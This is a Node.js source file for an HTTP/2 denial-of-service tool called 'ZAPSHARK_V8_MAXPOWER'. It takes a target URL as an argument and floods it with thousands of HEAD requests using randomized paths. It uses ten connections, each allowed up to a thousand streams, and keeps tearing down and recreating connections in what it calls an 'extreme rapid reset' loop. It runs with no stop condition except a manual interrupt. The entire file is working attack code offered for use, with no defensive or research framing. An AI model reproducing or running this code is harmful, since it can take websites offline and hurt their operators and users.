const http2 = require('http2');

class ZAPSHARK_V8_MAXPOWER {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.requestsSinceLastCalc = 0;
        this.lastDisplayUpdate = Date.now();
        
        // MAX POWER SETTINGS
        this.clients = [];
        this.clientCount = 10;
        this.maxStreamsPerClient = 1000;
        this.activeStreams = 0;
        
        // EXTREME RAPID RESET
        this.resetCounter = 0;
        
        // INTERVALS
        this.attackInterval = null;
        this.resetIntervalObj = null;
        this.displayInterval = null;
    }

    // === MAX CONNECTIONS ===
    initializeMaxConnections() {
        for (let i = 0; i < this.clientCount; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 32768,
                    maxDeflateDynamicTableSize: 4294967295,
                    peerMaxConcurrentStreams: 1000
                });
                
                client.setMaxListeners(1000);
                
                client.settings({
                    enablePush: false,
                    initialWindowSize: 16777215,
                    maxConcurrentStreams: 1000
                });
                
                client.on('error', () => {
                    setTimeout(() => {
                        const newClient = this.createClient();
                        if (newClient) {
                            this.clients[i] = newClient;
                        }
                    }, 10);
                });
                
                this.clients.push(client);
                
            } catch (err) {}
        }
    }

    createClient() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 32768
            });
            client.setMaxListeners(1000);
            client.on('error', () => {});
            return client;
        } catch (err) {
            return null;
        }
    }

    // === EXTREME RAPID RESET ===
    performExtremeReset() {
        this.resetCounter++;
        
        if (this.clients.length > 0) {
            const clientIndex = Math.floor(Math.random() * this.clients.length);
            const client = this.clients[clientIndex];
            
            if (client) {
                try {
                    client.destroy();
                    const newClient = this.createClient();
                    if (newClient) {
                        this.clients[clientIndex] = newClient;
                    }
                } catch (err) {}
            }
        }
    }

    // === MAX POWER ATTACK WITH HEAD METHOD ===
    sendMaxRequests() {
        if (this.clients.length === 0) return;
        
        const maxPossibleStreams = this.maxStreamsPerClient * this.clients.length;
        const availableStreams = maxPossibleStreams - this.activeStreams;
        const streamsThisTick = Math.max(1, Math.floor(availableStreams * 0.8));
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.clients[Math.floor(Math.random() * this.clients.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'HEAD',
                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5)
                });
                
                req.on('response', () => {
                    try { req.destroy(); } catch (e) {}
                });
                
                req.on('error', () => {
                    try { req.destroy(); } catch (e) {}
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // === ONLY LOGGING - OVERWRITING ===
    updateDisplay() {
        // OVERWRITE EVERY TIME
        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
    }

    // === MAIN - RUN FOREVER ===
    start() {
        this.initializeMaxConnections();
        
        setTimeout(() => {
            // EXTREME RAPID RESET
            this.resetIntervalObj = setInterval(() => {
                this.performExtremeReset();
            }, 0.5);
            
            // MAX ATTACK LOOP
            this.attackInterval = setInterval(() => {
                for (let batch = 0; batch < 5; batch++) {
                    this.sendMaxRequests();
                }
                this.updateDisplay();
            }, 0.1);
            
        }, 2000);
        
        // NO AUTO-STOP, ONLY MANUAL SIGINT
        process.on('SIGINT', () => {
            clearInterval(this.attackInterval);
            clearInterval(this.resetIntervalObj);
            
            this.clients.forEach(client => {
                try { client.destroy(); } catch (e) {}
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    process.exit(1);
}

process.env.UV_THREADPOOL_SIZE = 64;

const shark = new ZAPSHARK_V8_MAXPOWER(target);
shark.start();
